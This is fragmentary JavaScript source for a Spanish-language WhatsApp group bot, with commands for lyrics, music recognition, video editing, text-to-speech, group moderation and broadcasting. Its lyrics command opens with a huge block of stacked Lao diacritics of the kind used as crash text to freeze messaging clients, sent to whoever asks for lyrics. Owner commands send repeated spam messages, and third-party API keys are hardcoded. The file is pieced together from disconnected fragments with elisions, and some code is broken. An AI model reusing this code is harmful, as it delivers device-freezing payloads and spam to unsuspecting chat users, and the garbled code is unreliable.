let lirik = `「 *LYRICS* 」:\n..່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່\n${res[0].result}`
reply(lirik)
})
break
				case 'bilangangka':
				...
				break
				case 'resepmasakan':
				if (args.length < 1) return reply('nombre?')
...
break
 ...
 const supo = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 const  iiaa = await denz.downloadAndSaveMediaMessage(supo)
anu = await fetchJson(`https://api.zeks.me/api/searchmusic?apikey=apivinz&audio=${iiaa}`, {method: 'get'})
  resultadotest =`Nombre : ${anu.data.title} \nArtista : ${anu.data.artists}`
         fs.unlinkSync(ran)
  denz.sendMessage(from, resultadotest, text, {quoted:mek})
    break
case 'teste3':                 
 //const  sup = JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 const supoo = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 const  aiiaa = await denz.downloadAndSaveMediaMessage(supoo)
anu = await fetchJson(`https://api.zeks.me/api/searchmusic?apikey=apivinz&audio={aiiaa}`, {method: 'get'})
  resultadotest =`Nombre : ${anu.data.title} \nArtista : ${anu.data.artists}`
         fs.unlinkSync(ran)
  sendMediaURL(from, resultadotest, text, {quoted:mek})
    break
case 'musicsearch':
case 'smsc':
case 'shazam':
					case 'teste':                 
 //const  sup = JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 const sup = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 const  iaa = await denz.downloadAndSaveMediaMessage(sup)
  // wew = fs.readFileSync('image/odc.jpeg')
anu = await fetchJson(`https://api.zeks.me/api/searchmusic?apikey=apivinz&audio=${iaa}`, {method: 'get'})
  resultadotest =`Nombre : ${anu.data.title}
         Artista : ${anu.data.artists}`
  denz.sendMessage(from, resultadotest, text, {quoted:mek})
    break
case 'camararapida':
          ...
          var  encmediaxxx = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            var mediaAL = await denz.downloadAndSaveMediaMessage(encmediaxxx)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${mediaAL} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(mediaAL)
            if (err) return reply(`Error: ${err}`)
            buffer444 = fs.readFileSync(ran)
            denz.sendMessage(from, buffer444, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
case 'camaralenta':
            ...
            if (!isQuotedVideo) return reply('Menciona un video...!')
            reply(`_Acción En Proceso..._`)
           var encmediañ = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
           var mediañ = await denz.downloadAndSaveMediaMessage(encmediañ)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${mediañ} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(mediañ)
            if (err) return reply(`Error: ${err}`)
            buffer444 = fs.readFileSync(ran)
            denz.sendMessage(from, buffer444, video, { mimetype: 'video/mp4', quoted: mek})
            fs.unlinkSync(ran)
...
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Tiempo : ` + moment(`${i.t}` * 1000).tz('America/Lima').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
...
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('es mayor!')
...
if (Number(args[0]) >= 50) return reply('debe ser menor a 50!')
	...
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('debe ser menor a 50!')
	if (!Number(oi2)) return reply('La cantidad debe ser un número!')
	  for (let i = 0; i < oi2; i++) {
...
case 'battlefield':
case 'pubg':
if (args.length < 1) return reply(`${prefix}${command}`)
var m = c
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`https://api-alphabot.herokuapp.com/api/photooxy/${command}?apikey=Alphabot&text=${m1}&text2=${m2}`)
	sendMediaURL(from, photooxy, {thumbnail: Buffer.alloc(0), quoted: mek})
	break
	// photooxy
	// 1 text
case 'shadow':
...
case 'underflower':         
case 'underflower2':
if (args.length < 1) return reply(`${prefix}${command} + texto`)
let photooxy2 = await getBuffer(`https://api-alphabot.herokuapp.com/api/photooxy/${command}?apikey=alphabot&text=${c}`)
denz.sendMessage(from, photooxy2, image, {thumbnail: Buffer.alloc(0), quoted: mek})
break
//TEXT PRO
//2 TEXT
case 'halloween2':
...
case 'lava':
case 'bagel':
if (args.length < 1) return reply(`${prefix}${command} + texto1 + texto2`)
var m = c
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let textpro = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/${command}?apikey=Alphabot&text=${m1}&text2=${m2}`)
denz.sendMessage(from, textpro, image, {thumbnail: Buffer.alloc(0), quoted: mek})
break
//1 TEXT  
case 'blackpink':
case 'rainbow2':
...
case 'matrix':
				...
				case 'coloong':
				case 'robaar':
		if (!isQuotedSticker) return reply(`Responde un sticker *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    ...
		    denz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
				...
				case 'readmore':
                    ...
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply('Chat eliminado con éxito' + from)
                await sleep(4000)
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					reply('Todos los chats borrados con éxito')
					break
					case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`esta en mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot muteado en este grupo')
                break
					case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			...
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`Para activar escribe : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ grupo antilink habilitado')
						denz.sendMessage(from, `ALERTA!!! Grupo antilink activado\nSi envias un enlace de grupo seras eliminado inmediatamente`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Esta deshabilitado')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ grupo antilink deshabilitado')
					} else {
...
case 'autosticker':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply('solo admins del grupo')
					if (args.length < 1) return reply(`Activar:\n\n${prefix}autosticker 1\nDesactivar\n${prefix}autosticker 0`)
					if (Number(args[0]) === 1) {
						if (isAuto) return reply('esta activo')
						autosticker.push(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply('autosticker activado')
					} else if (Number(args[0]) === 0) {
...
case 'mododescarga':
					...
					if ((args[0]) === 'on') {
						if (isNsfw) return reply('el modo Descarga ya esta activo')
						nsfw.push(from)
						fs.writeFileSync('./lib/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Activado con exito el modo descarga en el grupo:\`\`\` *${groupName}*`)
					} else if ((args[0]) === 'off') {
						nsfw.splice(from, 1)
						fs.writeFileSync('./lib/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Modo descarga desactivado con exito en el grupo:\`\`\` *${groupName}*`)
					} else {
...
break
case 'tts':
					if (args.length < 1) return denz.sendMessage(from, `Falta el código del idioma\n Ejemplo : ${prefix}tts *es* yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return denz.sendMessage(from, `Falta el texto\n Ejemplo : ${prefix}tts es *yamate kudasai*`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 999
						? reply('El texto es demasiado largo perro')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								denz.sendMessage(from, buff, audio, { ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
				...
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(' seleccione el admin @tag!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    denz.groupDemoteAdmin(from, [demote])
						reply('Admin removido con éxito')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Responda al usuario!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    denz.groupMakeAdmin(from, [promote])
						reply('promovido con éxito')
						break
				case 'linkgrupo':
				case 'linkgroup':
				case 'linkgp':
         ...
         denz.query({json, expect200: true})
          reply('Listo, link de grupo nuevo')
         break
					case 'opengc':
					case 'og':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   reply(`Grupo abierto con éxito ${groupName}`)
						...
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						reply(`Grupo cerrado con éxito ${groupName}`)
						denz.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
case 'grupo':
case 'gp':
var ini_gopayy =`Buenas prro @${sender.split("@")[0]} Escribe (${prefix}og/${prefix}cg)si el boton no responde`
buttonss = [{buttonId: `cg`, buttonText: {displayText: 'Cerrar Grupo🔒'}, type: 1},{buttonId: `og`, buttonText: {displayText: 'Abrir Grupo🔓'}, type: 1}]
const buMesss = {
...
await denz.sendMessage(from, buMesss, MessageType.buttonsMessage, {quoted: ftok})
break
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Escriba ${prefix}spam texto|cantidad`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Escriba ${prefix}spam texto|cantidad`)
				if (Number(argzi[1]) >= 50) return reply('solo -50!')
				if (isNaN(argzi[1])) return reply(`tiene que ser un numero`)
			...
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`Para activar/desactivar Escribe : ${prefix}welcome 1/0`)
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya esta activo')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Activo con éxito la bienvenida')
					} else if (Number(args[0]) === 0) {
						if (!isWelkom) return reply('Esta inactivo')
						var ini = welkom.indexOf(from)
						welkom.splice(ini, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Desactivo con éxito la bienvenida')
					} else {
						reply('1 para activar, 0 para desactivar')
					}
					break
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
              ...
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					...
					reply(`Listo, nombre del grupo cambiado a: ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
					if (!isGroup) return reply(mess.only.group)
                   ...
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					...
					reply(`Listo, descripción del grupo cambiado a: ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
				denz.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Responde una foto!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						reply(`Tránsmision exitosa : ${body.slice(4)}`)
						...
						reply(`Transmisión exitosa : ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await denz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
        ...
        sendMess(_.jid, `${body.slice(4)}`)
           	break
					...
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Escriba ${prefix}spamsw text|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Escriba ${prefix}spam text|cantidad`)
				if (Number(argzi[1]) >= 50) return reply('el número debe ser >=50')
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					case 'apagar':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				reply2('Listo, bot apagado')
				await sleep(1000)
				return denz.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply2('Eror')
				break
				case 'tomp4':
					if (!isQuotedSticker) return reply('Responde el sticker/video')
                                        reply(mess.wait)
            ...
            reply('Responde el StickerVideo!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
...
break
            ...
            break
				...
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Escriba ${prefix}kontak @tag|nombre`)
				if (mek.message.extendedTextMessage != undefined){
				...
				if (!isGroupAdmins) return reply(mess.only.admin)
                argzi = arg.split('/')
				if (!argzi) return reply(`Escriba ${prefix}kontak @tag/nombre`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
...
break
			...
			if (args.length < 1) return reply(`Escriba ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
